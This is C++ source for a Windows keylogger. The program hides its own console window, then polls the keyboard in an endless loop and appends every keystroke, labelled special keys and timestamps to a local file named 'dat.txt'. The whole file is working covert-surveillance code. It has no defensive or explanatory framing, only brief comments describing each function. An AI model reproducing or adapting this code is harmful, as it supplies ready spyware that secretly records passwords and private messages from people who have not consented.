#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <ctime> // Include time library for timestamp

using namespace std;

// Function to log input to a file
void LOG(string input) {
    fstream LogFile;
    LogFile.open("dat.txt", fstream::app);
    if (LogFile.is_open()) {
        LogFile << input;
        LogFile.close();
    }
}

// Function to handle special keys and log them
bool SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        cout << " ";
        LOG(" ");
        return true;
    case VK_RETURN:
        cout << "\n";
        LOG("\n");
        return true;
    case VK_SHIFT:
        cout << "#SHIFT#";
        LOG("#SHIFT#");
        return true;
    case VK_BACK:
        cout << "\b";
        LOG("\b");
        return true;
    case VK_RBUTTON:
        cout << "#R_CLICK#";
        LOG("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        cout << "#CAPS_LOCK#";
        LOG("#CAPS_LOCK#");
        return true;
    case VK_TAB:
        cout << "#TAB#";
        LOG("#TAB#");
        return true;
    case VK_UP:
        cout << "#UP#";
        LOG("#UP_ARROW_KEY#");
        return true;
    case VK_DOWN:
        cout << "#DOWN#";
        LOG("#DOWN_ARROW_KEY#");
        return true;
    case VK_LEFT:
        cout << "#LEFT#";
        LOG("#LEFT_ARROW_KEY#");
        return true;
    case VK_RIGHT:
        cout << "#RIGHT#";
        LOG("#RIGHT_ARROW_KEY#");
        return true;
    case VK_CONTROL:
        cout << "#CONTROL#";
        LOG("#CONTROL#");
        return true;
    case VK_MENU:
        cout << "#ALT#";
        LOG("#ALT#");
        return true;
    default:
        return false;
    }
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        Sleep(10);
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767) {
                // Log timestamp
                time_t now = time(0);
                char* dt = ctime(&now);
                LOG("[");
                LOG(dt);
                LOG("]");

                if (SpecialKeys(KEY) == false) {
                    fstream LogFile;
                    LogFile.open("dat.txt", fstream::app);
                    if (LogFile.is_open()) {
                        LogFile << char(KEY);
                        LogFile.close();
                    }
                }
            }
        }
    }

    return 0;
}
